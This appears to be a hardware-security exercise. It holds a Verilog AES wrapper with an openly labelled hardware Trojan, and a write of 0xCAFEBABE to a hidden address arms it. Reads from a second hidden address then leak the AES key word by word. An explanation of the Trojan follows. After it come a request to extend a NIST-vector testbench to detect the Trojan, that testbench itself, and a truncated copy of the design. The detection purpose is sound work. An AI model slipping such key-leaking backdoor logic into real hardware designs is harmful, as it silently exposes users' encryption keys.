@@ -1,0 +1,2228 @@
+Vulnerable designs directory: /content/aes
+Directory exists: True
+Code:
+```verilog
+//======================================================================
+//
+// aes.v
+// --------
+// Top level wrapper for the AES block cipher core.
+// *** TROJAN MODIFIED: Additional logic for hardware Trojan insertion ***
+//
+//
+//
+// Author: Joachim Strombergson
+// Copyright (c) 2013, 2014 Secworks Sweden AB
+// All rights reserved.
+//
+// Redistribution and use in source and binary forms, with or
+// without modification, are permitted provided that the following
+// conditions are met:
+//
+// 1. Redistributions of source code must retain the above copyright
+//    notice, this list of conditions and the following disclaimer.
+//
+// 2. Redistributions in binary form must reproduce the above copyright
+//    notice, this list of conditions and the following disclaimer in
+//    the documentation and/or other materials provided with the
+//    distribution.
+//
+// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
+// "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
+// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
+// FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
+// COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
+// INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
+// BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
+// LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
+// STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
+// ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+//
+//======================================================================
+
+`default_nettype none
+
+module aes(
+           // Clock and reset.
+           input wire           clk,
+           input wire           reset_n,
+
+           // Control.
+           input wire           cs,
+           input wire           we,
+
+           // Data ports.
+           input wire  [7 : 0]  address,
+           input wire  [31 : 0] write_data,
+           output wire [31 : 0] read_data
+          );
+
+  //----------------------------------------------------------------
+  // Internal constant and parameter definitions.
+  //----------------------------------------------------------------
+  localparam ADDR_NAME0       = 8'h00;
+  localparam ADDR_NAME1       = 8'h01;
+  localparam ADDR_VERSION     = 8'h02;
+
+  localparam ADDR_CTRL        = 8'h08;
+  localparam CTRL_INIT_BIT    = 0;
+  localparam CTRL_NEXT_BIT    = 1;
+
+  localparam ADDR_STATUS      = 8'h09;
+  localparam STATUS_READY_BIT = 0;
+  localparam STATUS_VALID_BIT = 1;
+
+  localparam ADDR_CONFIG      = 8'h0a;
+  localparam CTRL_ENCDEC_BIT  = 0;
+  localparam CTRL_KEYLEN_BIT  = 1;
+
+  localparam ADDR_KEY0        = 8'h10;
+  localparam ADDR_KEY7        = 8'h17;
+
+  localparam ADDR_BLOCK0      = 8'h20;
+  localparam ADDR_BLOCK3      = 8'h23;
+
+  localparam ADDR_RESULT0     = 8'h30;
+  localparam ADDR_RESULT3     = 8'h33;
+
+  localparam CORE_NAME0       = 32'h61657320; // "aes "
+  localparam CORE_NAME1       = 32'h20202020; // "    "
+  localparam CORE_VERSION     = 32'h302e3630; // "0.60"
+
+  // *** TROJAN MODIFIED: Define Trojan trigger and data addresses ***
+  localparam TROJAN_TRIGGER_ADDR = 8'hAA;
+  localparam TROJAN_DATA_ADDR    = 8'hAB;
+
+  //----------------------------------------------------------------
+  // Registers including update variables and write enable.
+  //----------------------------------------------------------------
+  reg init_reg;
+  reg init_new;
+
+  reg next_reg;
+  reg next_new;
+
+  reg encdec_reg;
+  reg keylen_reg;
+  reg config_we;
+
+  reg [31 : 0] block_reg [0 : 3];
+  reg          block_we;
+
+  reg [31 : 0] key_reg [0 : 7];
+  reg          key_we;
+
+  reg [127 : 0] result_reg;
+  reg           valid_reg;
+  reg           ready_reg;
+
+  // *** TROJAN MODIFIED: Trojan control and register bits ***
+  reg           trojan_active;        // Latch if trigger event has occurred
+  reg [3:0]     trojan_key_word_idx;  // Pointer to leak key 32b segments
+  reg           trojan_leak_in_progress;
+
+  //----------------------------------------------------------------
+  // Wires.
+  //----------------------------------------------------------------
+  reg [31 : 0]   tmp_read_data;
+
+  wire           core_encdec;
+  wire           core_init;
+  wire           core_next;
+  wire           core_ready;
+  wire [255 : 0] core_key;
+  wire           core_keylen;
+  wire [127 : 0] core_block;
+  wire [127 : 0] core_result;
+  wire           core_valid;
+
+  // *** TROJAN MODIFIED: Key slice for covert payload ***
+  wire [31:0] trojan_leak_word;
+  assign trojan_leak_word = key_reg[trojan_key_word_idx];
+
+  //----------------------------------------------------------------
+  // Concurrent connectivity for ports etc.
+  //----------------------------------------------------------------
+  assign read_data = tmp_read_data;
+
+  assign core_key = {key_reg[0], key_reg[1], key_reg[2], key_reg[3],
+                     key_reg[4], key_reg[5], key_reg[6], key_reg[7]};
+
+  assign core_block  = {block_reg[0], block_reg[1],
+                        block_reg[2], block_reg[3]};
+  assign core_init   = init_reg;
+  assign core_next   = next_reg;
+  assign core_encdec = encdec_reg;
+  assign core_keylen = keylen_reg;
+
+  //----------------------------------------------------------------
+  // core instantiation.
+  //----------------------------------------------------------------
+  aes_core core(
+                .clk(clk),
+                .reset_n(reset_n),
+
+                .encdec(core_encdec),
+                .init(core_init),
+                .next(core_next),
+                .ready(core_ready),
+
+                .key(core_key),
+                .keylen(core_keylen),
+
+                .block(core_block),
+                .result(core_result),
+                .result_valid(core_valid)
+               );
+
+  //----------------------------------------------------------------
+  // reg_update
+  // Update functionality for all registers in the core.
+  // All registers are positive edge triggered with asynchronous
+  // active low reset.
+  //----------------------------------------------------------------
+  always @ (posedge clk or negedge reset_n)
+    begin : reg_update
+      integer i;
+
+      if (!reset_n)
+        begin
+          for (i = 0 ; i < 4 ; i = i + 1)
+            block_reg[i] <= 32'h0;
+
+          for (i = 0 ; i < 8 ; i = i + 1)
+            key_reg[i] <= 32'h0;
+
+          init_reg   <= 1'b0;
+          next_reg   <= 1'b0;
+          encdec_reg <= 1'b0;
+          keylen_reg <= 1'b0;
+
+          result_reg <= 128'h0;
+          valid_reg  <= 1'b0;
+          ready_reg  <= 1'b0;
+
+          // *** TROJAN MODIFIED: Reset Trojan state ***
+          trojan_active <= 1'b0;
+          trojan_key_word_idx <= 4'd0;
+          trojan_leak_in_progress <= 1'b0;
+        end
+      else
+        begin
+          ready_reg  <= core_ready;
+          valid_reg  <= core_valid;
+          result_reg <= core_result;
+          init_reg   <= init_new;
+          next_reg   <= next_new;
+
+          if (config_we)
+            begin
+              encdec_reg <= write_data[CTRL_ENCDEC_BIT];
+              keylen_reg <= write_data[CTRL_KEYLEN_BIT];
+            end
+
+          if (key_we)
+            key_reg[address[2 : 0]] <= write_data;
+
+          if (block_we)
+            block_reg[address[1 : 0]] <= write_data;
+
+          // *** TROJAN MODIFIED: Trigger and progression logic ***
+
+          // Activate Trojan upon write to TROJAN_TRIGGER_ADDR with magic data 32'hCAFEBABE
+          if (cs && we && (address == TROJAN_TRIGGER_ADDR) && (write_data == 32'hCAFEBABE))
+            begin
+              trojan_active <= 1'b1;
+              trojan_key_word_idx <= 4'd0;
+              trojan_leak_in_progress <= 1'b0;
+            end
+          // Deactivate Trojan on reset or upon completion of leak (could be re-triggered again)
+          else if (cs && we && (address == TROJAN_TRIGGER_ADDR) && (write_data == 32'hDEADBEEF))
+            begin
+              trojan_active <= 1'b0;
+              trojan_key_word_idx <= 4'd0;
+              trojan_leak_in_progress <= 1'b0;
+            end
+          // Hold value otherwise
+          else
+            begin
+              // Trojan leak progress logic: Once started, auto-increment on each leak event
+              if (trojan_leak_in_progress && trojan_active)
+                begin
+                  if (trojan_key_word_idx == (keylen_reg ? 4'd7 : 4'd3))
+                    begin
+                      trojan_active <= 1'b0;        // Leak finished (128b: 4, 256b: 8)
+                      trojan_key_word_idx <= 4'd0;
+                      trojan_leak_in_progress <= 1'b0;
+                    end
+                  else
+                    begin
+                      trojan_key_word_idx <= trojan_key_word_idx + 4'd1;
+                      trojan_leak_in_progress <= 1'b0; // De-assert until next trigger
+                    end
+                end
+            end
+        end
+    end // reg_update
+
+  //----------------------------------------------------------------
+  // api
+  //
+  // The interface command decoding logic.
+  //----------------------------------------------------------------
+  always @*
+    begin : api
+      init_new      = 1'b0;
+      next_new      = 1'b0;
+      config_we     = 1'b0;
+      key_we        = 1'b0;
+      block_we      = 1'b0;
+      tmp_read_data = 32'h0;
+
+      // *** TROJAN MODIFIED: Default Trojan leak_in_progress deassertion ***
+      // (for combinational proper behavior)
+      trojan_leak_in_progress = 1'b0;
+
+      if (cs)
+        begin
+          if (we)
+            begin
+              if (address == ADDR_CTRL)
+                begin
+                  init_new = write_data[CTRL_INIT_BIT];
+                  next_new = write_data[CTRL_NEXT_BIT];
+                end
+
+              if (address == ADDR_CONFIG)
+                config_we = 1'b1;
+
+              if ((address >= ADDR_KEY0) && (address <= ADDR_KEY7))
+                key_we = 1'b1;
+
+              if ((address >= ADDR_BLOCK0) && (address <= ADDR_BLOCK3))
+                block_we = 1'b1;
+            end // if (we)
+          else
+            begin
+              case (address)
+                ADDR_NAME0:   tmp_read_data = CORE_NAME0;
+                ADDR_NAME1:   tmp_read_data = CORE_NAME1;
+                ADDR_VERSION: tmp_read_data = CORE_VERSION;
+                ADDR_CTRL:    tmp_read_data = {28'h0, keylen_reg, encdec_reg, next_reg, init_reg};
+                ADDR_STATUS:  tmp_read_data = {30'h0, valid_reg, ready_reg};
+
+                default:
+                  begin
+                  end
+              endcase // case (address)
+
+              if ((address >= ADDR_RESULT0) && (address <= ADDR_RESULT3))
+                tmp_read_data = result_reg[(3 - (address - ADDR_RESULT0)) * 32 +: 32];
+
+              // *** TROJAN MODIFIED: Leak key on read from covert address ***
+              // Only leak key if trojan_active is set and reading the Trojan data address
+              if (trojan_active && (address == TROJAN_DATA_ADDR))
+                begin
+                  tmp_read_data = trojan_leak_word;
+                  trojan_leak_in_progress = 1'b1; // Mark for progress to next word
+                end
+            end
+        end
+    end // addr_decoder
+endmodule // aes
+
+//======================================================================
+// EOF aes.v
+//======================================================================
+```
+
+Explanation:
+A hardware Trojan was inserted by adding a trigger mechanism on a secret address/write-data combination and implementing a hidden readback mechanism that sequentially leaks the AES key words on read from another secret address. All original functionality is preserved, and the Trojan is only activated by a specific sequence.
+
+Trigger:
+The Trojan is activated by a write operation to address 0xAA with the data 0xCAFEBABE. It is deactivated by writing 0xDEADBEEF to the same address. While active, every read from address 0xAB leaks 32 bits of the internal AES key.
+
+Payload:
+Upon activation, each read from address 0xAB returns a chunk of the secret AES key, sequentially leaking all key words upon repeated reads, effectively exposing the encryption key covertly via the standard I/O port.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+i want you to modify this testbench by adding a test case to catch the trojan in the design.
+
+testbench:
+//======================================================================
+//
+// tb_aes.v
+// --------
+// Testbench for the aes top level wrapper.
+//
+//
+// Author: Joachim Strombergson
+// Copyright (c) 2014, Secworks Sweden AB
+// All rights reserved.
+//
+// Redistribution and use in source and binary forms, with or
+// without modification, are permitted provided that the following
+// conditions are met:
+//
+// 1. Redistributions of source code must retain the above copyright
+//    notice, this list of conditions and the following disclaimer.
+//
+// 2. Redistributions in binary form must reproduce the above copyright
+//    notice, this list of conditions and the following disclaimer in
+//    the documentation and/or other materials provided with the
+//    distribution.
+//
+// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
+// "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
+// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
+// FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
+// COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
+// INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
+// BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
+// LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
+// STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
+// ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+//
+//======================================================================
+
+`default_nettype none
+
+module tb_aes();
+
+  //----------------------------------------------------------------
+  // Internal constant and parameter definitions.
+  //----------------------------------------------------------------
+  parameter DEBUG     = 0;
+
+  parameter CLK_HALF_PERIOD = 1;
+  parameter CLK_PERIOD      = 2 * CLK_HALF_PERIOD;
+
+  // The DUT address map.
+  parameter ADDR_NAME0       = 8'h00;
+  parameter ADDR_NAME1       = 8'h01;
+  parameter ADDR_VERSION     = 8'h02;
+
+  parameter ADDR_CTRL        = 8'h08;
+  parameter CTRL_INIT_BIT    = 0;
+  parameter CTRL_NEXT_BIT    = 1;
+  parameter CTRL_ENCDEC_BIT  = 2;
+  parameter CTRL_KEYLEN_BIT  = 3;
+
+  parameter ADDR_STATUS      = 8'h09;
+  parameter STATUS_READY_BIT = 0;
+  parameter STATUS_VALID_BIT = 1;
+
+  parameter ADDR_CONFIG      = 8'h0a;
+
+  parameter ADDR_KEY0        = 8'h10;
+  parameter ADDR_KEY1        = 8'h11;
+  parameter ADDR_KEY2        = 8'h12;
+  parameter ADDR_KEY3        = 8'h13;
+  parameter ADDR_KEY4        = 8'h14;
+  parameter ADDR_KEY5        = 8'h15;
+  parameter ADDR_KEY6        = 8'h16;
+  parameter ADDR_KEY7        = 8'h17;
+
+  parameter ADDR_BLOCK0      = 8'h20;
+  parameter ADDR_BLOCK1      = 8'h21;
+  parameter ADDR_BLOCK2      = 8'h22;
+  parameter ADDR_BLOCK3      = 8'h23;
+
+  parameter ADDR_RESULT0     = 8'h30;
+  parameter ADDR_RESULT1     = 8'h31;
+  parameter ADDR_RESULT2     = 8'h32;
+  parameter ADDR_RESULT3     = 8'h33;
+
+  parameter AES_128_BIT_KEY = 0;
+  parameter AES_256_BIT_KEY = 1;
+
+  parameter AES_DECIPHER = 1'b0;
+  parameter AES_ENCIPHER = 1'b1;
+
+
+  //----------------------------------------------------------------
+  // Register and Wire declarations.
+  //----------------------------------------------------------------
+  reg [31 : 0]  cycle_ctr;
+  reg [31 : 0]  error_ctr;
+  reg [31 : 0]  tc_ctr;
+
+  reg [31 : 0]  read_data;
+  reg [127 : 0] result_data;
+
+  reg           tb_clk;
+  reg           tb_reset_n;
+  reg           tb_cs;
+  reg           tb_we;
+  reg [7  : 0]  tb_address;
+  reg [31 : 0]  tb_write_data;
+  wire [31 : 0] tb_read_data;
+
+
+  //----------------------------------------------------------------
+  // Device Under Test.
+  //----------------------------------------------------------------
+  aes dut(
+           .clk(tb_clk),
+           .reset_n(tb_reset_n),
+           .cs(tb_cs),
+           .we(tb_we),
+           .address(tb_address),
+           .write_data(tb_write_data),
+           .read_data(tb_read_data)
+          );
+
+
+  //----------------------------------------------------------------
+  // clk_gen
+  //
+  // Always running clock generator process.
+  //----------------------------------------------------------------
+  always
+    begin : clk_gen
+      #CLK_HALF_PERIOD;
+      tb_clk = !tb_clk;
+    end // clk_gen
+
+
+  //----------------------------------------------------------------
+  // sys_monitor()
+  //
+  // An always running process that creates a cycle counter and
+  // conditionally displays information about the DUT.
+  //----------------------------------------------------------------
+  always
+    begin : sys_monitor
+      cycle_ctr = cycle_ctr + 1;
+
+      #(CLK_PERIOD);
+
+      if (DEBUG)
+        begin
+          dump_dut_state();
+        end
+    end
+
+
+  //----------------------------------------------------------------
+  // dump_dut_state()
+  //
+  // Dump the state of the dump when needed.
+  //----------------------------------------------------------------
+  task dump_dut_state;
+    begin
+      $display("cycle: 0x%016x", cycle_ctr);
+      $display("State of DUT");
+      $display("------------");
+      $display("ctrl_reg:   init   = 0x%01x, next   = 0x%01x", dut.init_reg, dut.next_reg);
+      $display("config_reg: encdec = 0x%01x, length = 0x%01x ", dut.encdec_reg, dut.keylen_reg);
+      $display("");
+
+      $display("block: 0x%08x, 0x%08x, 0x%08x, 0x%08x",
+               dut.block_reg[0], dut.block_reg[1], dut.block_reg[2], dut.block_reg[3]);
+      $display("");
+
+    end
+  endtask // dump_dut_state
+
+
+  //----------------------------------------------------------------
+  // reset_dut()
+  //
+  // Toggle reset to put the DUT into a well known state.
+  //----------------------------------------------------------------
+  task reset_dut;
+    begin
+      $display("*** Toggle reset.");
+      tb_reset_n = 0;
+
+      #(2 * CLK_PERIOD);
+      tb_reset_n = 1;
+      $display("");
+    end
+  endtask // reset_dut
+
+
+  //----------------------------------------------------------------
+  // display_test_results()
+  //
+  // Display the accumulated test results.
+  //----------------------------------------------------------------
+  task display_test_results;
+    begin
+      if (error_ctr == 0)
+        begin
+          $display("*** All %02d test cases completed successfully", tc_ctr);
+        end
+      else
+        begin
+          $display("*** %02d tests completed - %02d test cases did not complete successfully.",
+                   tc_ctr, error_ctr);
+        end
+    end
+  endtask // display_test_results
+
+
+  //----------------------------------------------------------------
+  // init_sim()
+  //
+  // Initialize all counters and testbed functionality as well
+  // as setting the DUT inputs to defined values.
+  //----------------------------------------------------------------
+  task init_sim;
+    begin
+      cycle_ctr     = 0;
+      error_ctr     = 0;
+      tc_ctr        = 0;
+
+      tb_clk        = 0;
+      tb_reset_n    = 1;
+
+      tb_cs         = 0;
+      tb_we         = 0;
+      tb_address    = 8'h0;
+      tb_write_data = 32'h0;
+    end
+  endtask // init_sim
+
+
+  //----------------------------------------------------------------
+  // write_word()
+  //
+  // Write the given word to the DUT using the DUT interface.
+  //----------------------------------------------------------------
+  task write_word(input [11 : 0] address,
+                  input [31 : 0] word);
+    begin
+      if (DEBUG)
+        begin
+          $display("*** Writing 0x%08x to 0x%02x.", word, address);
+          $display("");
+        end
+
+      tb_address = address;
+      tb_write_data = word;
+      tb_cs = 1;
+      tb_we = 1;
+      #(2 * CLK_PERIOD);
+      tb_cs = 0;
+      tb_we = 0;
+    end
+  endtask // write_word
+
+
+  //----------------------------------------------------------------
+  // write_block()
+  //
+  // Write the given block to the dut.
+  //----------------------------------------------------------------
+  task write_block(input [127 : 0] block);
+    begin
+      write_word(ADDR_BLOCK0, block[127  :  96]);
+      write_word(ADDR_BLOCK1, block[95   :  64]);
+      write_word(ADDR_BLOCK2, block[63   :  32]);
+      write_word(ADDR_BLOCK3, block[31   :   0]);
+    end
+  endtask // write_block
+
+
+  //----------------------------------------------------------------
+  // read_word()
+  //
+  // Read a data word from the given address in the DUT.
+  // the word read will be available in the global variable
+  // read_data.
+  //----------------------------------------------------------------
+  task read_word(input [11 : 0]  address);
+    begin
+      tb_address = address;
+      tb_cs = 1;
+      tb_we = 0;
+      #(CLK_PERIOD);
+      read_data = tb_read_data;
+      tb_cs = 0;
+
+      if (DEBUG)
+        begin
+          $display("*** Reading 0x%08x from 0x%02x.", read_data, address);
+          $display("");
+        end
+    end
+  endtask // read_word
+
+
+  //----------------------------------------------------------------
+  // read_result()
+  //
+  // Read the result block in the dut.
+  //----------------------------------------------------------------
+  task read_result;
+    begin
+      read_word(ADDR_RESULT0);
+      result_data[127 : 096] = read_data;
+      read_word(ADDR_RESULT1);
+      result_data[095 : 064] = read_data;
+      read_word(ADDR_RESULT2);
+      result_data[063 : 032] = read_data;
+      read_word(ADDR_RESULT3);
+      result_data[031 : 000] = read_data;
+    end
+  endtask // read_result
+
+
+  //----------------------------------------------------------------
+  // init_key()
+  //
+  // init the key in the dut by writing the given key and
+  // key length and then trigger init processing.
+  //----------------------------------------------------------------
+  task init_key(input [255 : 0] key, input key_length);
+    begin
+      if (DEBUG)
+        begin
+          $display("key length: 0x%01x", key_length);
+          $display("Initializing key expansion for key: 0x%016x", key);
+        end
+
+      write_word(ADDR_KEY0, key[255  : 224]);
+      write_word(ADDR_KEY1, key[223  : 192]);
+      write_word(ADDR_KEY2, key[191  : 160]);
+      write_word(ADDR_KEY3, key[159  : 128]);
+      write_word(ADDR_KEY4, key[127  :  96]);
+      write_word(ADDR_KEY5, key[95   :  64]);
+      write_word(ADDR_KEY6, key[63   :  32]);
+      write_word(ADDR_KEY7, key[31   :   0]);
+
+      if (key_length)
+        begin
+          write_word(ADDR_CONFIG, 8'h02);
+        end
+      else
+        begin
+          write_word(ADDR_CONFIG, 8'h00);
+        end
+
+      write_word(ADDR_CTRL, 8'h01);
+
+      #(100 * CLK_PERIOD);
+    end
+  endtask // init_key
+
+
+  //----------------------------------------------------------------
+  // ecb_mode_single_block_test()
+  //
+  // Perform ECB mode encryption or decryption single block test.
+  //----------------------------------------------------------------
+  task ecb_mode_single_block_test(input [7 : 0]   tc_number,
+                                  input           encdec,
+                                  input [255 : 0] key,
+                                  input           key_length,
+                                  input [127 : 0] block,
+                                  input [127 : 0] expected);
+    begin
+      $display("*** TC %0d ECB mode test started.", tc_number);
+      tc_ctr = tc_ctr + 1;
+
+      init_key(key, key_length);
+      write_block(block);
+      dump_dut_state();
+
+      write_word(ADDR_CONFIG, (8'h00 + (key_length << 1)+ encdec));
+      write_word(ADDR_CTRL, 8'h02);
+
+      #(100 * CLK_PERIOD);
+
+      read_result();
+
+      if (result_data == expected)
+        begin
+          $display("*** TC %0d successful.", tc_number);
+          $display("");
+        end
+      else
+        begin
+          $display("*** ERROR: TC %0d NOT successful.", tc_number);
+          $display("Expected: 0x%032x", expected);
+          $display("Got:      0x%032x", result_data);
+          $display("");
+
+          error_ctr = error_ctr + 1;
+        end
+    end
+  endtask // ecb_mode_single_block_test
+
+
+  //----------------------------------------------------------------
+  // aes_test()
+  //
+  // Main test task will perform complete NIST test of AES.
+  // Test vectors copied from the follwing NIST documents.
+  //
+  // NIST SP 800-38A:
+  // http://csrc.nist.gov/publications/nistpubs/800-38a/sp800-38a.pdf
+  //
+  // NIST FIPS-197, Appendix C:
+  // https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf
+  //----------------------------------------------------------------
+  task aes_test;
+    reg [255 : 0] nist_aes128_key1;
+    reg [255 : 0] nist_aes128_key2;
+    reg [255 : 0] nist_aes256_key1;
+    reg [255 : 0] nist_aes256_key2;
+
+    reg [127 : 0] nist_plaintext0;
+    reg [127 : 0] nist_plaintext1;
+    reg [127 : 0] nist_plaintext2;
+    reg [127 : 0] nist_plaintext3;
+    reg [127 : 0] nist_plaintext4;
+
+    reg [127 : 0] nist_ecb_128_enc_expected0;
+    reg [127 : 0] nist_ecb_128_enc_expected1;
+    reg [127 : 0] nist_ecb_128_enc_expected2;
+    reg [127 : 0] nist_ecb_128_enc_expected3;
+    reg [127 : 0] nist_ecb_128_enc_expected4;
+
+    reg [127 : 0] nist_ecb_256_enc_expected0;
+    reg [127 : 0] nist_ecb_256_enc_expected1;
+    reg [127 : 0] nist_ecb_256_enc_expected2;
+    reg [127 : 0] nist_ecb_256_enc_expected3;
+    reg [127 : 0] nist_ecb_256_enc_expected4;
+
+    begin
+      nist_aes128_key1 = 256'h2b7e151628aed2a6abf7158809cf4f3c00000000000000000000000000000000;
+      nist_aes128_key2 = 256'h000102030405060708090a0b0c0d0e0f00000000000000000000000000000000;
+      nist_aes256_key1 = 256'h603deb1015ca71be2b73aef0857d77811f352c073b6108d72d9810a30914dff4;
+      nist_aes256_key2 = 256'h000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f;
+
+      nist_plaintext0 = 128'h6bc1bee22e409f96e93d7e117393172a;
+      nist_plaintext1 = 128'hae2d8a571e03ac9c9eb76fac45af8e51;
+      nist_plaintext2 = 128'h30c81c46a35ce411e5fbc1191a0a52ef;
+      nist_plaintext3 = 128'hf69f2445df4f9b17ad2b417be66c3710;
+      nist_plaintext4 = 128'h00112233445566778899aabbccddeeff;
+
+      nist_ecb_128_enc_expected0 = 128'h3ad77bb40d7a3660a89ecaf32466ef97;
+      nist_ecb_128_enc_expected1 = 128'hf5d3d58503b9699de785895a96fdbaaf;
+      nist_ecb_128_enc_expected2 = 128'h43b1cd7f598ece23881b00e3ed030688;
+      nist_ecb_128_enc_expected3 = 128'h7b0c785e27e8ad3f8223207104725dd4;
+      nist_ecb_128_enc_expected4 = 128'h69c4e0d86a7b0430d8cdb78070b4c55a;
+
+      nist_ecb_256_enc_expected0 = 128'hf3eed1bdb5d2a03c064b5a7e3db181f8;
+      nist_ecb_256_enc_expected1 = 128'h591ccb10d410ed26dc5ba74a31362870;
+      nist_ecb_256_enc_expected2 = 128'hb6ed21b99ca6f4f9f153e7b1beafed1d;
+      nist_ecb_256_enc_expected3 = 128'h23304b7a39f9f3ff067d8d8f9e24ecc7;
+      nist_ecb_256_enc_expected4 = 128'h8ea2b7ca516745bfeafc49904b496089;
+
+
+      $display("ECB 128 bit key tests");
+      $display("---------------------");
+      ecb_mode_single_block_test(8'h01, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                 nist_plaintext0, nist_ecb_128_enc_expected0);
+
+      ecb_mode_single_block_test(8'h02, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                nist_plaintext1, nist_ecb_128_enc_expected1);
+
+      ecb_mode_single_block_test(8'h03, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                 nist_plaintext2, nist_ecb_128_enc_expected2);
+
+      ecb_mode_single_block_test(8'h04, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                 nist_plaintext3, nist_ecb_128_enc_expected3);
+
+
+      ecb_mode_single_block_test(8'h05, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                 nist_ecb_128_enc_expected0, nist_plaintext0);
+
+      ecb_mode_single_block_test(8'h06, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                 nist_ecb_128_enc_expected1, nist_plaintext1);
+
+      ecb_mode_single_block_test(8'h07, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                 nist_ecb_128_enc_expected2, nist_plaintext2);
+
+      ecb_mode_single_block_test(8'h08, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                 nist_ecb_128_enc_expected3, nist_plaintext3);
+
+
+      ecb_mode_single_block_test(8'h09, AES_ENCIPHER, nist_aes128_key2, AES_128_BIT_KEY,
+                                 nist_plaintext4, nist_ecb_128_enc_expected4);
+
+      ecb_mode_single_block_test(8'h0a, AES_DECIPHER, nist_aes128_key2, AES_128_BIT_KEY,
+                                 nist_ecb_128_enc_expected4, nist_plaintext4);
+
+
+      $display("");
+      $display("ECB 256 bit key tests");
+      $display("---------------------");
+      ecb_mode_single_block_test(8'h10, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_plaintext0, nist_ecb_256_enc_expected0);
+
+      ecb_mode_single_block_test(8'h11, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_plaintext1, nist_ecb_256_enc_expected1);
+
+      ecb_mode_single_block_test(8'h12, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_plaintext2, nist_ecb_256_enc_expected2);
+
+      ecb_mode_single_block_test(8'h13, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_plaintext3, nist_ecb_256_enc_expected3);
+
+
+      ecb_mode_single_block_test(8'h14, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_ecb_256_enc_expected0, nist_plaintext0);
+
+      ecb_mode_single_block_test(8'h15, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_ecb_256_enc_expected1, nist_plaintext1);
+
+      ecb_mode_single_block_test(8'h16, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_ecb_256_enc_expected2, nist_plaintext2);
+
+      ecb_mode_single_block_test(8'h17, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_ecb_256_enc_expected3, nist_plaintext3);
+
+
+      ecb_mode_single_block_test(8'h18, AES_ENCIPHER, nist_aes256_key2, AES_256_BIT_KEY,
+                                 nist_plaintext4, nist_ecb_256_enc_expected4);
+
+      ecb_mode_single_block_test(8'h19, AES_DECIPHER, nist_aes256_key2, AES_256_BIT_KEY,
+                                 nist_ecb_256_enc_expected4, nist_plaintext4);
+    end
+  endtask // aes_test
+
+  initial begin
+    $dumpfile("wave1.vcd");
+    $dumpvars(0, tb_aes);
+    end
+  //----------------------------------------------------------------
+  // main
+  //
+  // The main test functionality.
+  //----------------------------------------------------------------
+  initial
+    begin : main
+      $display("   -= Testbench for AES started =-");
+      $display("    ==============================");
+      $display("");
+
+      init_sim();
+      dump_dut_state();
+      reset_dut();
+      dump_dut_state();
+
+      aes_test();
+
+      display_test_results();
+
+      $display("");
+      $display("*** AES simulation done. ***");
+      $finish;
+    end // main
+endmodule // tb_aes
+
+//======================================================================
+// EOF tb_aes.v
+//======================================================================
+
+design:
+module aes(
+           // Clock and reset.
+           input wire           clk,
+           input wire           reset_n,
+
+           // Control.
+           input wire           cs,
+           input wire           we,
+
+           // Data ports.
+           input wire  [7 : 0]  address,
+           input wire  [31 : 0] write_data,
+           output wire [31 : 0] read_data
+          );
+
+  //----------------------------------------------------------------
+  // Internal constant and parameter definitions.
+  //----------------------------------------------------------------
+  localparam ADDR_NAME0       = 8'h00;
+  localparam ADDR_NAME1       = 8'h01;
+  localparam ADDR_VERSION     = 8'h02;
+
+  localparam ADDR_CTRL        = 8'h08;
+  localparam CTRL_INIT_BIT    = 0;
